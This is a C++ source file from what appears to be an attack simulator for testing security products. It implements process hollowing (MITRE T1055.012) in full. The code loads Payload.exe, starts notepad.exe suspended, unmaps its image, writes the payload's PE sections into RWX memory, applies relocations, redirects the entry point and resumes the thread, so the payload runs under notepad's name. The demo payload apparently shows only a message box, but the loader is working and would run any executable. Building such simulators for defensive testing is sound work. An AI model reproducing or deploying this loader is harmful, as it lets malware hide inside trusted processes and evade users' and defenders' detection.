// HollowingLogic.cpp
// Full PE-based Process Hollowing implementation
// Reads Payload.exe from disk, maps it into notepad.exe via proper PE section mapping.

#include "framework.h"
#include "HollowingLogic.h"
#include "Logger.h"
#include <windows.h>
#include <winternl.h>
#include <string>
#include <sstream>
#include <vector>
#include <fstream>

// ============================================================
// Statically linked NtDll functions
// ============================================================
EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// ============================================================
// Helper: Get the path to Payload.exe (same folder as this .exe)
// ============================================================
static std::wstring GetPayloadPath()
{
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    std::wstring pathStr(exePath);
    size_t pos = pathStr.find_last_of(L"\\");
    return pathStr.substr(0, pos + 1) + L"Payload.exe";
}

// ============================================================
// Helper: Read entire file into a byte vector
// ============================================================
static std::vector<BYTE> ReadFileToBuffer(const std::wstring& filePath)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
        return {};

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer((size_t)size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size))
        return {};

    return buffer;
}

// ============================================================
// Process Hollowing Attack (T1055.012)
// Full PE-based implementation: maps Payload.exe into notepad.exe
// ============================================================
DWORD PerformProcessHollowing()
{
    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    try
    {
        LogActivity("============================================");
        LogActivity("ArgusShield Attack Simulator - Process Hollowing");
        LogActivity("============================================");
        LogActivity("Technique: Process Hollowing (Full PE Mapping)");
        LogActivity("MITRE ATT&CK: T1055.012");
        LogActivity("");

        // Suppress crash dialogs from the hollowed process
        SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

        // ======================================================
        // PRE-STEP: Read Payload.exe from disk
        // ======================================================
        LogActivity("[PRE-STEP] Reading Payload.exe from disk...");

        std::wstring payloadPath = GetPayloadPath();

        // Convert wide string to narrow for logging
        char narrowPath[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, payloadPath.c_str(), -1, narrowPath, MAX_PATH, NULL, NULL);
        LogActivity("  -> Path: " + std::string(narrowPath));

        std::vector<BYTE> payloadData = ReadFileToBuffer(payloadPath);
        if (payloadData.empty())
        {
            LogActivity("[ERROR] Failed to read Payload.exe!");
            LogActivity("[ERROR] Ensure Payload.exe is in the same folder as this executable.");
            return 0;
        }

        LogActivity("[SUCCESS] Payload read: " + std::to_string(payloadData.size()) + " bytes");

        // ======================================================
        // PRE-STEP: Parse PE headers of Payload.exe
        // ======================================================
        LogActivity("");
        LogActivity("[PRE-STEP] Parsing Payload PE headers...");

        BYTE* pPayload = payloadData.data();

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayload;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        {
            LogActivity("[ERROR] Invalid DOS signature in Payload.exe!");
            return 0;
        }

        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPayload + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        {
            LogActivity("[ERROR] Invalid NT signature in Payload.exe!");
            return 0;
        }

        DWORD payloadImageBase = (DWORD)(DWORD_PTR)pNtHeaders->OptionalHeader.ImageBase;
        DWORD payloadSizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
        DWORD payloadEntryRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        DWORD payloadSizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
        WORD  numberOfSections = pNtHeaders->FileHeader.NumberOfSections;

        {
            std::stringstream ss;
            ss << "  -> Preferred ImageBase: 0x" << std::hex << payloadImageBase;
            LogActivity(ss.str());
        }
        {
            std::stringstream ss;
            ss << "  -> SizeOfImage: 0x" << std::hex << payloadSizeOfImage << " (" << std::dec << payloadSizeOfImage << " bytes)";
            LogActivity(ss.str());
        }
        {
            std::stringstream ss;
            ss << "  -> EntryPoint RVA: 0x" << std::hex << payloadEntryRVA;
            LogActivity(ss.str());
        }
        LogActivity("  -> Number of sections: " + std::to_string(numberOfSections));

        // List sections
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < numberOfSections; i++)
        {
            char sectionName[9] = { 0 };
            memcpy(sectionName, pSectionHeader[i].Name, 8);

            std::stringstream ss;
            ss << "  -> Section [" << sectionName << "] VA: 0x" << std::hex << pSectionHeader[i].VirtualAddress
               << " Size: 0x" << pSectionHeader[i].SizeOfRawData;
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 1: Create target process in SUSPENDED state
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 1] Creating target process in SUSPENDED state...");
        LogActivity("  -> Target: C:\\Windows\\System32\\notepad.exe");

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        wchar_t targetPath[] = L"C:\\Windows\\System32\\notepad.exe";

        BOOL created = CreateProcessW(
            targetPath, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi
        );

        if (!created)
        {
            LogActivity("[ERROR] CreateProcessW failed. Error: " + std::to_string(GetLastError()));
            return 0;
        }

        hProcess = pi.hProcess;
        hThread = pi.hThread;

        LogActivity("[SUCCESS] notepad.exe created in SUSPENDED state");
        LogActivity("  -> PID: " + std::to_string(pi.dwProcessId));

        // ======================================================
        // STEP 2: Query PEB to get original ImageBase
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 2] Querying PEB for original ImageBase...");

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;

        NTSTATUS status = NtQueryInformationProcess(
            hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength
        );

        if (status != 0)
        {
            LogActivity("[ERROR] NtQueryInformationProcess failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread); CloseHandle(hProcess);
            return 0;
        }

        PVOID pebAddress = pbi.PebBaseAddress;
        PVOID originalImageBase = nullptr;

#ifdef _WIN64
        SIZE_T pebImageBaseOffset = 0x10;
#else
        SIZE_T pebImageBaseOffset = 0x08;
#endif

        ReadProcessMemory(hProcess, (PBYTE)pebAddress + pebImageBaseOffset,
            &originalImageBase, sizeof(PVOID), nullptr);

        {
            std::stringstream ss;
            ss << "[SUCCESS] Original ImageBase: 0x" << std::hex << (DWORD_PTR)originalImageBase;
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 3: Unmap original image (NtUnmapViewOfSection)
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 3] Unmapping original notepad image...");

        status = NtUnmapViewOfSection(hProcess, originalImageBase);
        if (status == 0)
            LogActivity("[SUCCESS] Original image unmapped.");
        else
            LogActivity("[WARNING] NtUnmapViewOfSection returned non-zero, proceeding...");

        // ======================================================
        // STEP 4: Allocate memory for payload image
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 4] Allocating memory for payload in target process...");

        // Try to allocate at the payload's preferred base first
        LPVOID remoteBase = VirtualAllocEx(
            hProcess,
            (LPVOID)(DWORD_PTR)pNtHeaders->OptionalHeader.ImageBase,
            payloadSizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        bool needsRelocation = false;

        if (!remoteBase)
        {
            LogActivity("  -> Preferred base unavailable, allocating at alternate address...");
            remoteBase = VirtualAllocEx(
                hProcess, NULL, payloadSizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            );
            needsRelocation = true;
        }

        if (!remoteBase)
        {
            LogActivity("[ERROR] VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread); CloseHandle(hProcess);
            return 0;
        }

        {
            std::stringstream ss;
            ss << "[SUCCESS] Memory allocated at: 0x" << std::hex << (DWORD_PTR)remoteBase;
            LogActivity(ss.str());
        }

        if (needsRelocation)
            LogActivity("  -> Base relocation will be applied.");

        // ======================================================
        // STEP 5: Write PE headers + sections into target
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 5] Writing PE headers and sections...");

        // Write PE headers
        SIZE_T written = 0;
        WriteProcessMemory(hProcess, remoteBase, pPayload, payloadSizeOfHeaders, &written);
        LogActivity("  -> Headers written: " + std::to_string(written) + " bytes");

        // Write each section
        pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < numberOfSections; i++)
        {
            if (pSectionHeader[i].SizeOfRawData == 0)
                continue;

            LPVOID sectionDest = (PBYTE)remoteBase + pSectionHeader[i].VirtualAddress;
            LPVOID sectionSrc = pPayload + pSectionHeader[i].PointerToRawData;

            WriteProcessMemory(hProcess, sectionDest, sectionSrc,
                pSectionHeader[i].SizeOfRawData, &written);

            char sectionName[9] = { 0 };
            memcpy(sectionName, pSectionHeader[i].Name, 8);

            std::stringstream ss;
            ss << "  -> Section [" << sectionName << "] mapped at 0x"
               << std::hex << (DWORD_PTR)sectionDest
               << " (" << std::dec << written << " bytes)";
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 5b: Apply base relocations if needed
        // ======================================================
        if (needsRelocation)
        {
            LogActivity("");
            LogActivity("[STEP 5b] Applying base relocations...");

            DWORD_PTR delta = (DWORD_PTR)remoteBase - pNtHeaders->OptionalHeader.ImageBase;

            IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            if (relocDir.VirtualAddress != 0 && relocDir.Size > 0)
            {
                // Find the relocation data in our local copy of the payload
                DWORD relocOffset = 0;
                pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
                for (int i = 0; i < numberOfSections; i++)
                {
                    if (relocDir.VirtualAddress >= pSectionHeader[i].VirtualAddress &&
                        relocDir.VirtualAddress < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData)
                    {
                        relocOffset = pSectionHeader[i].PointerToRawData +
                            (relocDir.VirtualAddress - pSectionHeader[i].VirtualAddress);
                        break;
                    }
                }

                if (relocOffset > 0)
                {
                    DWORD relocProcessed = 0;
                    int blockCount = 0;

                    while (relocProcessed < relocDir.Size)
                    {
                        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pPayload + relocOffset + relocProcessed);

                        if (pReloc->SizeOfBlock == 0)
                            break;

                        DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                        WORD* pEntries = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));

                        for (DWORD j = 0; j < numEntries; j++)
                        {
                            WORD type = pEntries[j] >> 12;
                            WORD offset = pEntries[j] & 0x0FFF;

                            if (type == IMAGE_REL_BASED_DIR64)
                            {
                                DWORD_PTR patchAddr = (DWORD_PTR)remoteBase + pReloc->VirtualAddress + offset;

                                DWORD_PTR originalValue = 0;
                                ReadProcessMemory(hProcess, (PVOID)patchAddr, &originalValue, sizeof(DWORD_PTR), nullptr);

                                DWORD_PTR relocatedValue = originalValue + delta;
                                WriteProcessMemory(hProcess, (PVOID)patchAddr, &relocatedValue, sizeof(DWORD_PTR), nullptr);
                            }
                            else if (type == IMAGE_REL_BASED_HIGHLOW)
                            {
                                DWORD_PTR patchAddr = (DWORD_PTR)remoteBase + pReloc->VirtualAddress + offset;

                                DWORD originalValue = 0;
                                ReadProcessMemory(hProcess, (PVOID)patchAddr, &originalValue, sizeof(DWORD), nullptr);

                                DWORD relocatedValue = originalValue + (DWORD)delta;
                                WriteProcessMemory(hProcess, (PVOID)patchAddr, &relocatedValue, sizeof(DWORD), nullptr);
                            }
                        }

                        relocProcessed += pReloc->SizeOfBlock;
                        blockCount++;
                    }

                    LogActivity("[SUCCESS] Applied " + std::to_string(blockCount) + " relocation blocks (delta: 0x" +
                        ([&]() { std::stringstream ss; ss << std::hex << delta; return ss.str(); })() + ")");
                }
                else
                {
                    LogActivity("[WARNING] Could not locate relocation data in file.");
                }
            }
            else
            {
                LogActivity("[WARNING] Payload has no relocation directory.");
            }
        }

        // ======================================================
        // STEP 6: Set thread context — redirect entry point
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 6] Redirecting entry point...");

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(hThread, &ctx))
        {
            LogActivity("[ERROR] GetThreadContext failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread); CloseHandle(hProcess);
            return 0;
        }

        DWORD_PTR newEntryPoint = (DWORD_PTR)remoteBase + payloadEntryRVA;

#ifdef _WIN64
        ctx.Rcx = newEntryPoint;
#else
        ctx.Eax = (DWORD)newEntryPoint;
#endif

        if (!SetThreadContext(hThread, &ctx))
        {
            LogActivity("[ERROR] SetThreadContext failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread); CloseHandle(hProcess);
            return 0;
        }

        {
            std::stringstream ss;
            ss << "[SUCCESS] Entry point set to: 0x" << std::hex << newEntryPoint;
            LogActivity(ss.str());
        }

        // Update PEB ImageBaseAddress
        WriteProcessMemory(hProcess, (PBYTE)pebAddress + pebImageBaseOffset,
            &remoteBase, sizeof(PVOID), nullptr);
        LogActivity("[SUCCESS] PEB ImageBaseAddress updated.");

        // ======================================================
        // STEP 7: Resume thread — payload executes!
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 7] Resuming thread — payload will execute inside notepad.exe...");

        DWORD suspendCount = ResumeThread(hThread);
        if (suspendCount == (DWORD)-1)
        {
            LogActivity("[ERROR] ResumeThread failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread); CloseHandle(hProcess);
            return 0;
        }

        LogActivity("[SUCCESS] Thread resumed!");
        LogActivity("");
        LogActivity("============================================");
        LogActivity("[COMPLETE] PROCESS HOLLOWING SUCCESSFUL!");
        LogActivity("============================================");
        LogActivity("  -> notepad.exe (PID " + std::to_string(pi.dwProcessId) + ") is now hollowed");
        LogActivity("  -> Payload.exe MessageBox should appear");
        LogActivity("  -> In Task Manager, process name is still notepad.exe");
        LogActivity("============================================");

        // Don't terminate — let the payload MessageBox show!
        // User will close it manually.
        CloseHandle(hThread);
        CloseHandle(hProcess);

        return pi.dwProcessId;
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during process hollowing");
        if (hProcess)
        {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        if (hThread) CloseHandle(hThread);
        return 0;
    }
}
